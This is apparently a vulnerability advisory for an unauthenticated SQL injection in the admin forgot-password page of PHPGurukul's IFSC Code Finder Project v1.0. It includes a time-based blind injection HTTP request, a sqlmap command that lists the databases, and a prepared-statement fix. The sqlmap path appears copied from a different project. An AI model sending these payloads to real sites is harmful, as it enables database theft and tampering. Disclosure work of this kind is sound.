# SQL Injection Vulnerability in IFSC Code Finder Project

## 🛠 Affected Product
- **Product:** IFSC Code Finder Project  
- **Version:** v1.0  
- **Vendor:** [phpgurukul.com](https://phpgurukul.com/ifsc-code-finder-project-using-php/)  
- **Download Link:** [Download v1.0](https://phpgurukul.com/?sdm_process_download=1&download_id=14478)

---

## 🧨 Vulnerability Details

- **Type:** SQL Injection  
- **Location:** `/admin/forgot-password.php`  
- **Vulnerable Parameters:** `email`, `contactno`
- **Authentication Required:** ❌ No (public access)
- **Submitter:** bananoname

---

## 📋 Description

A critical SQL Injection vulnerability exists in `admin/forgot-password.php` in the IFSC Code Finder Project v1.0 by PHPGurukul. The application does not properly sanitize user-supplied input (`email` and `contactno`) before using it in SQL queries, allowing unauthenticated attackers to inject malicious SQL.

### Impact:
- Unauthorized database access
- Data leakage and tampering
- Possible full system compromise

---

## 🧪 Proof of Concept (PoC)

``````http
POST /admin/forgot-password.php HTTP/1.1
Host: victim-site.com
Content-Type: application/x-www-form-urlencoded

email=admin' AND (SELECT 1218 FROM (SELECT(SLEEP(5)))NvLc) AND 'HtBe'='HtBe&contactno=12323123&submit=Reset
``````
![image](https://github.com/user-attachments/assets/074eb397-1114-4e00-8b1b-1b346ac008c5)

✅ Expected Behavior:
Page should return "Invalid details"

❌ Actual Behavior:
Page redirects to reset-password.php even when email/contact doesn't exist, indicating successful injection.

And then use sqlmap below 
And then use sqlmap like this:

```bash
sqlmap -u 'http://10.20.3.7/msms/admin/forgot-password.php' \
# ↓↓↓ This is the vulnerable input ↓↓↓
--data="email=admin&contactno=12323123&submit=Reset" \
--dbs
```
![image](https://github.com/user-attachments/assets/960a424f-6e75-4219-9e30-fbc0b8da8124)
## 🎯 Impact
An attacker can exploit this vulnerability to:
- Bypass authentication
- Read sensitive data from the database
- Modify or delete data
- Escalate privileges
- Potentially achieve full control over the system

## 🛠 Suggested Repair
- To patch this vulnerability:
- ✅ Replace unsafe query:
```
$query = mysqli_query($con, "SELECT ID FROM tbladmin WHERE Email='$email' AND MobileNumber='$contactno'");
```
❌ Unsafe: Uses raw user input in SQL.
✅ Use prepared statements (MySQLi) instead:
```
$stmt = $con->prepare("SELECT ID FROM tbladmin WHERE Email = ? AND MobileNumber = ?");
$stmt->bind_param("ss", $email, $contactno);
$stmt->execute();
$result = $stmt->get_result();
```
## ➕ Additional Recommendations:
- Validate input types (e.g., regex for email and contact number)
- Enable error logging (not error_reporting(0))
- Use a Web Application Firewall (WAF)
- Sanitize all POST/GET parameters before using them
